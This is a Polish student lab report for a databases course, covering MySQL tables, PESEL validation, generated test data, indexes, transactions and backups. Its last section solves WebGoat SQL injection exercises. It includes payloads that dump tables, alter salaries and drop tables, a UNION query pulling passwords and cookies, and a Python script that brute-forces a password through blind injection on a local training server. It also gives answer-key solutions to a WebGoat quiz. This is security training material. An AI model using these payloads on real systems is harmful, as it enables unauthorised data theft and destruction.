# Sprawozdanie [Lista03](https://cs.pwr.edu.pl/bojko/pdfy/db-lab3.pdf)
## Przedmiot: Bazy danych i systemy informacyjne
## Prowadzący: Mgr Dominik Bojko
**Autor: Maciej Bazela**
**Indeks: 261743**
**Grupa: Śr. 7:30-9:00**
**Kod grupy: K06-46a**
**Używany dialekt zapytań: MySQL**

[Github Markdown](https://github.com/Flowyh/bazy-danych-sem3/blob/main/lista03/sprawozdanie-lista03-261743.md)

## Rozwiązania zadań:

**Zad 1.**

* Raport:
  
  Tworzenie bazy:
  ```sql
  create database db_ludzie; # 1
  ```
  Tworzenie tabel.
  Kluczem głównym w tabeli ludzie jest ID int.
  Według mnie nie numer PESEL nie powinien być kluczem, ponieważ jest to dana osobowa. 
  Każda kwerenda/widok/nowa tabela korzystająca z tabeli ludzie udostępniała by ten PESEL dalej, co jest rażącym błędem w sensie GDPR:
  ```sql
  create table if not exists Ludzie # 2
  (
      ID             int unsigned    not null auto_increment, # 3 # 5
      PESEL          varchar(11)     not null check (char_length(PESEL) = 11),
      imie           varchar(30)     not null,
      nazwisko       varchar(30)     not null,
      data_urodzenia date            not null,
      plec           enum ('K', 'M') not null,
      primary key (ID)
  );

  create table if not exists Zawody # 2
  (
      zawod_id   int unsigned not null auto_increment,         # 5
      nazwa      varchar(50)  not null,
      pensja_min float        not null check (pensja_min > 0), # 6 # 5
      pensja_max float        not null check (pensja_max > 0), # 5
      primary key (zawod_id),
      constraint check_pensja check (pensja_min < pensja_max)
  );

  create table if not exists Pracownicy # 2
  (
      ID       int unsigned not null,                    # 5
      zawod_id int unsigned not null,                    # 5
      pensja   float        not null check (pensja > 0), # 5
      foreign key (ID) references Ludzie (ID),
      foreign key (zawod_id) references Zawody (zawod_id)
  );
  ```
  Sprawdzanie poprawności PESEL-u.
  Sprawdzamy checksum i zgodność miesiąca i roku:
  ```sql
  drop function if exists pesel_checksum;
  delimiter @@
  create function pesel_checksum(pesel varchar(11))
      returns int deterministic
  begin
      declare wage int;
      declare sum int default 0;
      declare ch varchar(1);
      declare it int default 0;
      while it < 10
          do
              set wage = (select elt((it % 4) + 1, 1, 3, 7, 9));
              set ch = substr(pesel, it + 1, 1);
              set sum = sum + (ch * wage) % 10;
              set it = it + 1;
          end while;
      return ((10 - (sum % 10)) % 10);
  end @@
  ```
  ```sql
  drop function if exists check_pesel_date;
  delimiter **
  create function check_pesel_date(pesel varchar(11))
      returns int deterministic
  begin
      declare p_year varchar(2) default substr(pesel, 1, 2);
      declare p_month varchar(2) default substr(pesel, 3, 2);
      declare p_day varchar(2) default substr(pesel, 5, 2);
      if (p_month % 20 > 12 or p_month % 20 < 1) then return 0; end if; # Wrong month format
      set p_month = right(concat('00', p_month % 20), 2);
      return str_to_date(concat(p_year, p_month, p_day), '%y%m%d') is not null;
  end **
  ```
  Przed dodaniem danych do tabeli sprawdzany jest trigger, w razie błędnego PESEL-u wysyłamy sygnał błędu:
  ```sql
  drop trigger if exists validate_pesel;
  delimiter $$
  create trigger validate_pesel # 4
      before insert
      on Ludzie
      for each row
  begin
      if pesel_checksum(NEW.pesel) != substr(NEW.pesel, 11, 1) and check_pesel_date(NEW.pesel) = 1 then
          signal sqlstate '45000' set message_text = 'Invalid PESEL number, validation failed.';
      end if;
  end $$
  ```
  Tabele z losowymi imionami i nazwiskami:
  ```sql
  create table if not exists random_women
  (
      first_name varchar(30) not null,
      last_name  varchar(30) not null
  );

  insert ignore into random_women(first_name, last_name)
  values ('Anna', 'Nowak'),
        ('Alicja', 'Kowalska'),
        ('Barbara', 'Dąbrowska'),
        ('Celina', 'Wiśniewska'),
        ('Danuta', 'Wójcik'),
        ('Elżbieta', 'Lewandowska'),
        ('Halina', 'Zielińska'),
        ('Małgorzata', 'Kowalczyk'),
        ('Marysia', 'Kamińska'),
        ('Patrycja', 'Szymańska');

  create table if not exists random_men
  (
      first_name varchar(30) not null,
      last_name  varchar(30) not null
  );

  insert ignore into random_men(first_name, last_name)
  values ('Jan', 'Woźniak'),
        ('Jakub', 'Kowalski'),
        ('Adam', 'Polański'),
        ('Stanisław', 'Płachetko'),
        ('Zbigniew', 'Wiśniewski'),
        ('Maciej', 'Kamiński'),
        ('Ryszard', 'Zieliński'),
        ('Roman', 'Nowak'),
        ('Kamil', 'Kowalski'),
        ('Radosław', 'Lewandowski'),
        ('Bolesław', 'Kaczmarek');
  ```
  Generowanie losowych osób.
  Liczymy przedział czasowy z którego możemy losować datę urodzenia nowej osoby (w UNIX timestampie).
  Losowe 3 numery w numerze PESEL biorę z current timestampa, czwartą losuję ze względu na płeć (mężczyźni nieparzysta, kobiety parzysta).
  Jeśli rok urodzenia >= 2000, to dodaję 20 do miesiąca. Nie sprawdzałem innych zakresów, bo na potrzeby tego zadania wydawało mi się to zbędne:
  ```sql
  drop procedure if exists generateData;
  delimiter !!
  create procedure generateData(in age_start int, in age_end int, in number int)
  begin
      declare date_start date default current_date() - interval age_end year;
      declare date_end date default current_date() - interval age_start year;
      declare gender varchar(1);
      declare birth_date date;
      declare birth_numbers varchar(6);
      declare random_numbers varchar(4);
      declare pesel varchar(11);
      declare first varchar(30);
      declare last varchar(30);
      declare it int default 0;
      while it < number
          do
              set gender = (select elt((it % 2) + 1, 'K', 'M'));
              set birth_date = timestampadd(
                SECOND, 
                floor(rand() * timestampdiff(SECOND, date_start, date_end)), 
                date_start
              ); # Random date from (date_end, date_start) range
              set random_numbers = right(
                unix_timestamp(), 
                3
              ); # Random 3 numbers == last 3 timestamp numbers
              set first = (
                select first_name from random_men 
                order by RAND() 
                limit 1
              ); # Random first name
              set last = (
                select last_name 
                from random_men 
                order by RAND() 
                limit 1
              ); # Random last name
              if ((it % 2) = 0) then
                  set first = (
                    select first_name 
                    from random_women 
                    order by RAND() 
                    limit 1
                  ); # Woman
                  set last = (
                    select last_name 
                    from random_women 
                    order by RAND() 
                    limit 1
                  ); # Woman
              end if;
              if year(birth_date) >= 2000 then 
              # I should check for dates like >2100 etc, but I can't be bothered to do that, so I'm only going to use years from range 1900-2099
                  set birth_numbers = concat(
                    date_format(birth_date, '%y'), 
                    date_format(birth_date, '%m') + 20,
                    date_format(birth_date, '%d')
                  );
              else
                  set birth_numbers = date_format(birth_date, '%y%m%d');
              end if;
              set pesel = concat(
                birth_numbers, random_numbers, 
                (((2 * floor(rand() * 5 + 1) - (it % 2)))) % 10
              ); # If woman: random even, if man: random odd.
              set pesel = concat(
                pesel, 
                pesel_checksum(pesel)
              );
              insert into Ludzie(PESEL, imie, nazwisko, data_urodzenia, plec)
              values (pesel, first, last, birth_date, gender);
              set it = it + 1;
          end while;
  end !!

  call generateData(1, 18, 5);
  call generateData(19, 59, 45);
  call generateData(60, 80, 5);
  ```
  Przypisanie zawodu do pełnoletnich osób:
  ```sql
  insert into Zawody(nazwa, pensja_min, pensja_max) # 8
  values ('polityk', 5000, 12000),
        ('nauczyciel', 1000, 2000),
        ('informatyk', 4000, 12000),
        ('lekarz', 3000, 9000);

  drop procedure if exists assignJobs;
  delimiter &&
  create procedure assignJobs() # 9
  begin
      declare done int default 0;
      declare curr_id, curr_job int;
      declare birth_date date;
      declare gender varchar(1);
      declare salary float;
      declare peopleCur cursor for select ID from Ludzie; # declare cursor
      declare continue handler for not found set done = 1; # if nothing else can be retrieved from Ludzie table

      open peopleCur;
      getPerson:
      loop
          fetch peopleCur into curr_id;
          if done = 1 then leave getPerson; end if;
          set birth_date = (select data_urodzenia from Ludzie where ID = curr_id);
          set gender = (select plec from Ludzie where ID = curr_id);
          if timestampdiff(YEAR, birth_date, current_date()) >= 18 then
              if timestampdiff(YEAR, birth_date, current_date()) > 65 and gender = 'M'
                  or timestampdiff(YEAR, birth_date, current_date()) > 60 and gender = 'K'
              then
                  set curr_job = floor(rand() * 3) + 1;
              else
                  set curr_job = floor(rand() * 4) + 1;
              end if;
              set salary = rand() * (select (pensja_max - pensja_min) from Zawody where zawod_id = curr_job) +
                          (select pensja_min from Zawody where zawod_id = curr_job); # Random salary from range (min, max)
              insert into Pracownicy(ID, zawod_id, pensja)
              values (curr_id, curr_job, salary);
          end if;
      end loop;
      close peopleCur;
  end &&

  call assignJobs();

  # Quick check
  select l.ID
  from Ludzie l
          join Pracownicy p on l.ID = p.ID
  where timestampdiff(YEAR, data_urodzenia, current_date()) > 60
    and p.zawod_id = 4
    and l.plec = 'K';
    ```

**Zad 2**

* Query:
  ```sql
  # drop index nameGenderIx on Ludzie;
  create index nameGenderIx using btree on Ludzie (imie, plec);
  # drop index salaryIx on Pracownicy;
  create index salaryIx using btree on Pracownicy (pensja);

  # 3.1
  explain select *
  from Ludzie 
  where plec = 'K'
    and imie like 'A%';

  # 3.2
  explain select *
  from Ludzie
  where plec = 'K';

  # 3.3
  explain select *
  from Ludzie
  where imie like 'K%';

  # 3.4
  explain select *
  from Ludzie l
          join Pracownicy p on l.ID = p.ID
  where p.pensja < 2000;

  # 3.5
  explain select *
  from Ludzie l
          join Pracownicy p on l.ID = p.ID
          join Zawody z on p.zawod_id = z.zawod_id
  where z.nazwa = 'informatyk'
    and l.plec = 'M'
    and p.pensja > 10000;

  # 4.1
  show index from Ludzie; # 2.5
  # 4.2
  show index from Pracownicy; # 2.5
  ```
  Dla obu tabel mamy założone indeksy dla kluczy głównych/obcych, oraz te które właśnie utworzyliśmy:
  ```
  Pracownicy: ID, zawod_id, salaryIx.
  Ludzie: PRIMARY, nameGenderIx, nameGenderIx.
  ```
  Optymalizator użyje indeksów we wszytkich powyższych kwerendach, poza # 3.2.

**Zad 3**

* Query:
  ```sql
  drop procedure if exists raise;

  delimiter @@
  create procedure raise(in nazwa_zawodu varchar(50))
  begin
      start transaction;
      update Pracownicy p
          join Zawody z on p.zawod_id = z.zawod_id
      set pensja = pensja * 1.05
      where z.nazwa = nazwa_zawodu;

      select @max_salary := max(p.pensja)
      from Pracownicy p
              join Zawody z on z.zawod_id = p.zawod_id
      where z.nazwa = nazwa_zawodu;
      select @limit := z.pensja_max
      from Zawody z
      where z.nazwa = nazwa_zawodu;

      if @max_salary > @limit then
          rollback;
      else
          commit;
      end if;
  end @@

  call raise('informatyk'); # should fail
  call raise('lekarz'); # should work
  ```

**Zad 4**

* Query:
  ```sql
  set @zawod = 'informatyk';

  prepare countWomen from
      'select count(plec) from Ludzie l
          join Pracownicy p on l.ID = p.ID
          join Zawody z on p.zawod_id = z.zawod_id
      where plec = \'K\' and z.nazwa = ?';

  # Example
  execute countWomen using @zawod;

  deallocate prepare countWomen;
  ```
  

**Zad 5**

* Raport:
  Uruchamiamy z poziomu docker CLI (bo mam mysql na dockerze):
  Flaga -R jest po to, aby zapisać stworzone routines.
  ```sh
  mysqldump -u root --password=... db_ludzie -R > db_ludzie_dump.sql
  ```
  lub print do konsoli:
  ```sh
  mysqldump -u root --password=... db_ludzie -R | cat
  ```

  Przywracanie backupu:
  ```sh
  cat db_ludzie_dump.sql | mysql -u root --password=... db_ludzie
  ```
  lub
  ```sh
  mysql -u root --password=... < db_ludzie_dump.sql
  ```
  Backup pełny zapisuje wszystkie dane z bazy, różnicowy zapisuje tylko zmiany względem pierwszego pełnego backupu.

**Zad 6**

* SQL Injection (introduction)
  Zad. 2. 
  ```sql
  select department from Employees where first_name = 'Bob' and last_name = 'Franco';
  ```
  Zad. 3.
  ```sql
  update Employees set department = 'Sales' where first_name = 'Tobi' and last_name = 'Barnett';
  ``` 
  Zad. 4.
  ```sql
  alter table Employees add phone varchar(20);
  ``` 
  Zad. 5.
  ```sql
  grant all on grant_rights to unauthorized_user;
  ``` 
  Zad. 9.
  ```sql
  ' or '1' = '1;
  ```
  Zad. 10.
  ```sql
  Login count: 1
  User_id: 1 OR 1 = 1;--
  ```
  Zad. 11.
  ```sql
  3SL99A';select * from employees;--
  ```
  Zad. 12.
  ```sql
  3SL99A';update employees set salary = '2137000' where auth_tan = '3SL99A';--
  ```
  Zad. 13.
  ```sql
  ';drop table access_log;--
  ```
* SQL Injection (advanced)
  Zad. 3.
  ```sql
  '; select * from user_system_data;--
  ```
  Korzystając z union:
  ```sql
  ' union select 1, user_name, password, cookie, 'a', 'a', 1 from user_system_data;--
  ```
  Zad. 5.
  Register form jest podatny na atak, na polu username:
  ```sql
  tom' AND '1' = ' 
  ```
  Zwraca:
  ```
  User {0} already exists please try to register with a different username.
  ```
  Dopóki dostajemy powyższy komunikat, to znaczy że dostajemy **TRUE**.
  Teraz sprawdzamy czy 1 litera hasła to jest np. a:
  ```sql
  tom' AND substring(password, 1, 1) ='a
  ```
  Atakiem bruteforce, możemy poznać hasło Toma.
  Potrzebujemy URL na który będziemy wysyłać zapytania, jakich headerów potrzebujemy i jaki body musimy przesyłać:
  ```
  Request URL: http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge
  ```
  Autoryzujemy się do WebGoat poprzez Cookie:
  ```
  Cookie: JSESSIONID=DDQos9rvlcM7xgIGLKvJQD7DIv8qmPgIM0r0dRfX; WEBWOLFSESSION=lqEaXggkOKIAUWMRihT91pzh3L1sf_QkVqVeGvDf
  ```
  Payload:
  ```
  username_reg: tom
  email_reg: test@test
  password_reg: a
  confirm_password_reg: a
  ```
  Za pomocą skryptu w pythonie, który po kolei pyta o każdą literę alfabetu, znajdujemy hasło   **thisisasecretfortomonly**:
  ```py
  import json
  import requests

  def find_tom_pass():
    mask = "abcdefghjiklmnopqrstuvwxyzABCDEFGHJIKLMNOPQRSTUVWXYZ"
    curr = 0
    index = 1
    result = ''
    while True:
      inject = f"tom' AND substring(password, {index}, 1) ='{mask[curr]}"
      print(inject)
      req = requests.put(
        "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge",
        headers = {
          "Cookie": "JSESSIONID=DDQos9rvlcM7xgIGLKvJQD7DIv8qmPgIM0r0dRfX; WEBWOLFSESSION=lqEaXggkOKIAUWMRihT91pzh3L1sf_QkVqVeGvDf"
        },
        data = {
          "username_reg": inject, # vulnerable form input  
          "email_reg": "brute@force",
          "password_reg": "goodbye", 
          "confirm_password_reg": "goodbye" 
        }
      )
      
      try:
        res = json.loads(req.text)
      except:
        print('Wrong sessionID')
        return
      
      if "already exists please try to register with a different username" in res['feedback']:
        result += mask[curr]
        curr = 0
        index += 1
        print(result)
      else:
        curr += 1
        if curr == len(mask):
          print(result)
          return
      
  find_tom_pass()
  ```

  Zad. 6.
  ```
  1. What is the difference between a prepared statement and a statement?
  Solution 4: A statement has got values instead of a prepared statement
  2. Which one of the following characters is a placeholder for variables?
  Solution 3: ?
  3. How can prepared statements be faster than statements?
  Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.
  4. How can a prepared statement prevent SQL-Injection?
  Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.
  5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?
  Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
  ```